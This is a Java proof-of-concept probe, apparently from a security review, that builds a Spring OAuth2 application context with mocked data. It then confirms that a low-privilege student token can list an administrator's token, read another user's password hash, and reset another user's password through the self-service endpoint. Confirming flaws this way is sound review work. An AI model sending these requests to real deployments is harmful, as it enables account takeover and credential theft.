import java.lang.reflect.*;
import java.util.*;
import javax.sql.DataSource;
import com.globits.security.*;
import com.globits.security.domain.*;
import com.globits.security.repository.*;
import com.globits.security.rest.*;
import com.globits.security.service.UserService;
import com.globits.security.service.impl.UserServiceImpl;
import com.globits.security.filter.*;
import com.globits.core.utils.SecurityUtils;
import com.globits.richy.config.*;
import org.springframework.context.annotation.*;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.oauth2.common.*;
import org.springframework.security.oauth2.provider.*;
import org.springframework.security.oauth2.provider.token.*;
import org.springframework.security.oauth2.provider.token.store.*;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableResourceServer;
import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.mock.web.MockServletContext;
import org.springframework.test.web.servlet.*;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.security.web.FilterChainProxy;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;

/** Local-only probe: all accounts, bearer values and database responses are fake. */
public class AuthEndpointSecurityProbe {
 static User victim;
 static void inject(Object target,String name,Object value)throws Exception {Field f=target.getClass().getDeclaredField(name);f.setAccessible(true);f.set(target,value);}
 @Configuration @EnableWebMvc @EnableResourceServer
 @Import({WebSecurityConfig.class,MethodSecurityConfig.class})
 public static class Config extends OAuth2ResourceServerConfig {
  @Bean public DataSource dataSource(){return (DataSource)Proxy.newProxyInstance(DataSource.class.getClassLoader(),new Class[]{DataSource.class},(p,m,a)->{if(m.getName().equals("toString"))return "reviewDataSource";if(m.getName().equals("hashCode"))return System.identityHashCode(p);if(m.getName().equals("equals"))return p==a[0];throw new UnsupportedOperationException("No real database in review probe");});}
  @Bean public CorsFilter corsFilter(){return new CorsFilter();}
  @Bean public JsonToUrlEncodedAuthenticationFilter jsonFilter(){return new JsonToUrlEncodedAuthenticationFilter();}
  @Bean(name="userService") public CustomUserDetailsService details(){return new CustomUserDetailsService();}
  @Bean public UserService reviewUserService()throws Exception {
   final UserRepository repo=(UserRepository)Proxy.newProxyInstance(UserRepository.class.getClassLoader(),new Class[]{UserRepository.class},(p,m,a)->{
    if(m.getName().equals("findOne") || m.getName().equals("findById"))return Long.valueOf(22).equals(a[0])?victim:null;
    if(m.getName().equals("findByUsername"))return "review-victim".equals(a[0])?victim:null;
    if(m.getName().equals("save"))return a[0];
    throw new UnsupportedOperationException(m.toString());
   });
   final UserServiceImpl service=new UserServiceImpl();inject(service,"userRepository",repo);
   return (UserService)Proxy.newProxyInstance(UserService.class.getClassLoader(),new Class[]{UserService.class},(p,m,a)->{
    if(m.getDeclaringClass()==Object.class){if(m.getName().equals("toString"))return "reviewUserService";if(m.getName().equals("hashCode"))return System.identityHashCode(p);if(m.getName().equals("equals"))return p==a[0];}
    return m.invoke(service,a);
   });
  }
  @Bean public RestUserController restUsers(){return new RestUserController();}
  @Bean public TokenController tokens(){return new TokenController();}
  @Bean @Override public TokenStore tokenStore(){return new InMemoryTokenStore();}
  @Bean @Primary @Override public DefaultTokenServices tokenServices(){DefaultTokenServices s=new DefaultTokenServices();s.setTokenStore(tokenStore());return s;}
 }
 static void check(boolean value,String label){if(!value)throw new AssertionError(label);System.out.println("CONFIRMED " + label);}
 static OAuth2Authentication auth(User user,String role){
  List<GrantedAuthority> authorities=Arrays.<GrantedAuthority>asList(new SimpleGrantedAuthority(role));
  OAuth2Request request=new OAuth2Request(Collections.<String,String>emptyMap(),"review-client",authorities,true,Collections.singleton("read"),Collections.<String>emptySet(),null,Collections.<String>emptySet(),Collections.<String,java.io.Serializable>emptyMap());
  return new OAuth2Authentication(request,new UsernamePasswordAuthenticationToken(user,null,authorities));
 }
 public static void main(String[] args)throws Exception {
  ((ch.qos.logback.classic.Logger)org.slf4j.LoggerFactory.getLogger(org.slf4j.Logger.ROOT_LOGGER_NAME)).setLevel(ch.qos.logback.classic.Level.WARN);
  User attacker=new User();attacker.setId(11L);attacker.setUsername("review-user");attacker.setActive(true);
  victim=new User();victim.setId(22L);victim.setUsername("review-victim");victim.setActive(true);victim.setPassword("review-original-hash");
  AnnotationConfigWebApplicationContext ctx=new AnnotationConfigWebApplicationContext();ctx.setServletContext(new MockServletContext());
  Map<String,Object> properties=new HashMap<>();properties.put("endpoints.cors.allowed-headers","Authorization,Content-Type");properties.put("endpoints.cors.allowed-methods","GET,POST,PUT,DELETE,OPTIONS");properties.put("endpoints.cors.allowed-origins","https://review.invalid");properties.put("endpoints.cors.allow-credentials","true");properties.put("endpoints.cors.max-age","3600");ctx.getEnvironment().getPropertySources().addFirst(new org.springframework.core.env.MapPropertySource("review",properties));
  ctx.register(Config.class);ctx.refresh();
  TokenStore store=ctx.getBean(TokenStore.class);store.storeAccessToken(new DefaultOAuth2AccessToken("fake-user-token"),auth(attacker,"ROLE_STUDENT"));store.storeAccessToken(new DefaultOAuth2AccessToken("fake-admin-token"),auth(victim,"ROLE_ADMIN"));
  MockMvc mvc=MockMvcBuilders.webAppContextSetup(ctx).addFilters(ctx.getBean(FilterChainProxy.class)).build();
  MvcResult anonymous=mvc.perform(get("/tokens/review-client")).andReturn();check(anonymous.getResponse().getStatus()==401,"resource filter rejects anonymous token listing");
  MvcResult tokens=mvc.perform(get("/tokens/review-client").header("Authorization","Bearer fake-user-token")).andReturn();check(tokens.getResponse().getStatus()==200 && tokens.getResponse().getContentAsString().contains("fake-admin-token"),"ROLE_STUDENT bearer gets another user's administrator token through HTTP");
  MvcResult hashes=mvc.perform(get("/api/users").param("username","review-victim").header("Authorization","Bearer fake-user-token")).andReturn();check(hashes.getResponse().getStatus()==200 && hashes.getResponse().getContentAsString().contains("review-original-hash"),"ROLE_STUDENT HTTP user lookup exposes victim hash");
  MvcResult password=mvc.perform(put("/api/users/password/self").header("Authorization","Bearer fake-user-token").contentType("application/json").content("{\"username\":\"review-user\",\"id\":22,\"password\":\"review-new-password\"}")).andReturn();check(password.getResponse().getStatus()==200 && SecurityUtils.passwordsMatch(victim.getPassword(),"review-new-password"),"ROLE_STUDENT HTTP self password endpoint changes another user's password");
  ctx.close();
 }
}
